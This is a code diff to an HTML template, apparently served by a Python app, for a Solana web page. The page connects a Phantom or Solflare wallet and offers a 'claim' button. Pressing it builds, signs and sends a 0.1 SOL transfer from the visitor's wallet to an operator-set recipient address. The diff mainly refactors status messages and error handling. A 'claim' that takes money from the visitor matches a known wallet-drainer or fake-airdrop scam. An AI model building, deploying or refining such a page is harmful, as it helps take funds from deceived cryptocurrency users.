@@ -80,13 +80,17 @@ HTML_TEMPLATE = """
     let provider = null;
     let publicKey = null;
 
+    function formatSol(lamports) {
+      return (lamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(3);
+    }
+
     connectBtn.addEventListener('click', async () => {
       if (window.solana?.isPhantom) {
         provider = window.solana;
       } else if (window.solflare?.isSolflare) {
         provider = window.solflare;
       } else {
-        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare wallet browser.";
+        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare.";
         qr.style.display = "block";
         return;
       }
@@ -97,10 +101,9 @@ HTML_TEMPLATE = """
         publicKey = response.publicKey || provider.publicKey;
         status.innerText = "✅ Connected: " + publicKey.toString();
         claimBtn.disabled = false;
-        qr.style.display = "none";
       } catch (err) {
         console.error("Connection failed:", err);
-        status.innerText = "❌ Wallet connection failed or rejected.";
+        status.innerText = "❌ Wallet connection failed.";
       }
     });
 
@@ -110,10 +113,6 @@ HTML_TEMPLATE = """
         return;
       }
 
-      claimBtn.disabled = true;
-      connectBtn.disabled = true;
-      status.innerText = "⏳ Preparing transaction...";
-
       const network = networkSelect.value;
       const connection = new solanaWeb3.Connection(
         solanaWeb3.clusterApiUrl(network),
@@ -121,36 +120,31 @@ HTML_TEMPLATE = """
       );
 
       const recipientPubkey = new solanaWeb3.PublicKey("{{ wallet }}");
+      const amountLamports = Math.floor(0.1 * solanaWeb3.LAMPORTS_PER_SOL);
+
+      status.innerText = `⏳ Preparing to send ${formatSol(amountLamports)} SOL...`;
 
       try {
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
             toPubkey: recipientPubkey,
-            lamports: Math.floor(0.1 * solanaWeb3.LAMPORTS_PER_SOL),
+            lamports: amountLamports,
           })
         );
 
         transaction.feePayer = publicKey;
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
+        const latestBlockhash = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = latestBlockhash.blockhash;
 
-        status.innerText = "🔐 Awaiting your signature...";
-        const signedTransaction = await provider.signTransaction(transaction);
-
-        status.innerText = "🚀 Sending transaction...";
-        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-
-        status.innerText = "⏳ Confirming transaction...";
-        await connection.confirmTransaction(signature, 'confirmed');
+        let signed = await provider.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(signature);
 
         status.innerText = "✅ Transaction successful! Signature: " + signature;
       } catch (err) {
         console.error("Transaction failed:", err);
-        status.innerText = "❌ Transaction failed: " + (err.message || err.toString());
-      } finally {
-        claimBtn.disabled = false;
-        connectBtn.disabled = false;
+        status.innerText = "❌ Transaction failed: " + err.message;
       }
     });
   </script>
